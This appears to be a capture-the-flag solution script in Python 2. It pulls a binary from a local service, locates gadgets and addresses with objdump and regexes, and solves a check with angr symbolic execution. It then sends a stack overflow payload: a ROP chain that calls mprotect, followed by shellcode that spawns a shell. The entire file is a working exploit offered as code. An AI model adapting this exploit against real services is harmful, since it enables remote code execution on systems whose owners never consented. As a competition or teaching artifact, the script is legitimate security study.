#!/usr/bin/env python2
import angr
import sys
import os
import re
from pwn import *

context(arch = 'amd64')

# Mistakes were made

context.log_level = 'error'

def get_addresses(path):
    # Objdump all the segments
    res = {}
    o = ''
    p = process(['objdump', '-S', '-M', 'intel', path])
    while 1:
        try:
            o += p.recv(1024)
        except EOFError:
            break

    # Seg
    hex_rex = '([\dabcdef]*)'
    put_rex = '<puts@plt>\n'
    rex = put_rex + '.{0,1024}?' + put_rex
    seg = re.search(rex, o, flags = re.DOTALL).group(0)

    # Find start
    start = re.search(hex_rex + ':', seg).group(1)
    res['start'] = int(start, 16)

    # Find buf
    buf = re.findall('movzx  eax,.*?# ' + hex_rex, seg)
    res['buf'] = min(map(lambda x: int(x, 16), buf))

    # Find avoid
    avoid = re.search(hex_rex + ':', seg.split('\n')[-3]).group(1)
    res['avoid'] = int(avoid, 16)

    # Find target
    target = re.search('\n(.*)?<memcpy@plt>:', o).group(1)
    res['target'] = int(target, 16)

    # Find xor pad
    s = re.search('xor.{0,1024}?.xor.*?\n', o, flags = re.DOTALL).group(0)
    s = re.findall('xor.*?,.*?\n', s)
    s = map(lambda x: x.split(',')[-1], s)
    s = map(lambda x: int(x, 16) % 0xff, s)
    res['pad'] = map(chr, s)

    # Find load gadget
    s = re.search(hex_rex + ':.*?mov.*?rdi,QWORD PTR \[rbp-0x' + hex_rex, o)
    res['load_gadget'] = int(s.group(1).strip(), 16)
    res['load_offset'] = int(s.group(2).strip(), 16)
    print 'Load gadget = 0x%x' % res['load_gadget']
    print 'Load offset = 0x%x' % res['load_offset']

    # Find mprotect
    s = re.search(hex_rex + ' <mprotect@plt>', o).group(1).strip()
    res['plt_mprotect'] = int(s, 16)
    print 'Mprotect = 0x%x' % res['plt_mprotect']

    # Find buffer location
    s = re.search('ecx,0x' + hex_rex + '.{0,512}rax,\[rbp-0x' + hex_rex + '\].{0,512}<memcpy@plt>', o, flags = re.DOTALL)
    res['buf_loc'] = int(s.group(1), 16)
    res['overflow_size'] = int(s.group(2), 16)
    print 'Buffer location = 0x%x' % res['buf_loc']
    print 'Buffer overflow size = 0x%x' % res['overflow_size']

    print 'Buf = 0x%x' % res['buf']
    print 'Start = 0x%x' % res['start']
    print 'Avoid = 0x%x' % res['avoid']
    print 'Target = 0x%x' % res['target']

    return res

conn = remote('localhost', '9005')
lines = conn.recvuntil('here, get this binary').split('\n')
x = zip(map(len, lines), lines)
x.sort()
write('code.b64', x[-1][1])
os.system('base64 -d code.b64 | gunzip > code')
tar = 'code'

# Find dynamic elements in file
loc = get_addresses(tar)

# Create symbolic buffer
p = angr.Project(tar)
buf = angr.claripy.BVS("buf",48*8)
start_state = p.factory.blank_state(addr=loc['start'])
start_state.memory.store(loc['buf'], buf)

# Setup a stack frame
start_state.regs.rbp = start_state.regs.rsp
start_state.regs.rsp = start_state.regs.rsp - 0x50
start_state.memory.store(start_state.regs.rsp, start_state.se.BVV(0, 8*0x32))

# Setup stepper
pg = p.factory.path_group(start_state)
def step_func(pg):
    pg.drop(filter_func = lambda path: path.addr == loc['avoid'])
    pg.stash(filter_func = lambda path: path.addr == loc['target'], from_stash='active', to_stash='found')
    return pg
pg.step(step_func = step_func, until = lambda pg: len(pg.found) > 0)
f = pg.found[0]
cert = f.state.se.any_str(buf)
print cert.encode('hex')

# Payload layout
mprotect_offset = 0x200
shellcode_offset = 0x300

# Calculate addresses
mprotect_addr = loc['buf_loc'] + mprotect_offset
shellcode_addr = loc['buf_loc'] + shellcode_offset
print 'Mprotect arguments @ 0x%x' % mprotect_addr
print 'Shellcode @ 0x%x' % shellcode_addr

# First RIP override (jump to load gadget)
kill = ''
kill += cyclic(loc['overflow_size'], alphabet = 'ABCD')
kill += p64(mprotect_addr + loc['load_offset'])
kill += p64(loc['load_gadget'])

# Setup mprotect arguments
shellcode_address = loc['buf_loc'] + shellcode_offset
page = shellcode_address & 0xFFFFFFFFFFFFF000
print 'Page = 0x%x' % page
kill += cyclic(mprotect_offset - len(kill), n = 8) # Pad payload
kill += p64(page)                           # RDI
kill += p64(0x1338)                         # junk (RCX)
kill += p64(0x1337)                         # junk (R8)
kill += p64(0x10000)                        # RSI
kill += p64(0x7)                            # RDX
kill += p64(page)                           # RAX (sometimes RDI <- RAX)

# Run second rop chain
kill += cyclic(loc['load_offset'] - 0x30, n = 8)   # Get to RBP (RBP now points here)
kill += p64(loc['buf_loc'] + 0x600)
kill += p64(loc['plt_mprotect'])
kill += p64(shellcode_address)

# Shellcode
kill += cyclic(shellcode_offset - len(kill), n = 8)
kill += asm(shellcraft.sh())

# Write payload
payload = xor(cert + kill, loc['pad'], cut = 'max')
conn.sendline(payload.encode('hex'))
conn.interactive()